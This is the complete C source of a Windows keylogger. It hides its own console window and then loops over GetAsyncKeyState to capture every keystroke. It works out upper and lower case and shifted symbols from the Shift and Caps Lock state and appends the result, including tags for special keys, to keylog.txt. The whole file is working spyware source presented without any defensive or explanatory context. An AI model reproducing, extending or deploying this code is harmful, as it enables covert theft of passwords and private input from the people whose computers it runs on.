#include <stdio.h>
#include <windows.h>

int isCapsLockOn() {
    return (GetKeyState(VK_CAPITAL) & 0x0001);
}

int isShiftPressed() {
    return (GetAsyncKeyState(VK_SHIFT) & 0x8000);
}

char translateKey(int vkCode) {
    int shift = isShiftPressed();
    int caps = isCapsLockOn();

    if (vkCode >= 'A' && vkCode <= 'Z') {
        if ((caps && !shift) || (!caps && shift))
            return vkCode; // uppercase
        else
            return vkCode + 32; // lowercase
    }

    if (vkCode >= '0' && vkCode <= '9') {
        if (!shift) return vkCode;
        switch (vkCode) {
            case '1': return '!'; case '2': return '@'; case '3': return '#';
            case '4': return '$'; case '5': return '%'; case '6': return '^';
            case '7': return '&'; case '8': return '*'; case '9': return '(';
            case '0': return ')';
        }
    }

    // More special keys
    switch (vkCode) {
        case VK_SPACE: return ' ';
        case VK_RETURN: return '\n';
        case VK_TAB: return '\t';
    }

    return 0;
}

int main() {
    HWND stealth;
    AllocConsole();
    stealth = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(stealth, 0);  // Hide console

    FILE *file;
    char ch;

    while (1) {
        Sleep(10);
        for (int key = 8; key <= 255; key++) {
            if (GetAsyncKeyState(key) & 1) {
                file = fopen("keylog.txt", "a+");
                if (file == NULL) continue;

                ch = translateKey(key);
                if (ch != 0) {
                    fputc(ch, file);
                } else {
                    // Handle special keys not covered above
                    switch (key) {
                        case VK_BACK: fprintf(file, "[BACK]"); break;
                        case VK_SHIFT: fprintf(file, "[SHIFT]"); break;
                        case VK_CONTROL: fprintf(file, "[CTRL]"); break;
                        case VK_ESCAPE: fprintf(file, "[ESC]"); break;
                        default: fprintf(file, "[%d]", key); break;
                    }
                }

                fclose(file);
            }
        }
    }

    return 0;
}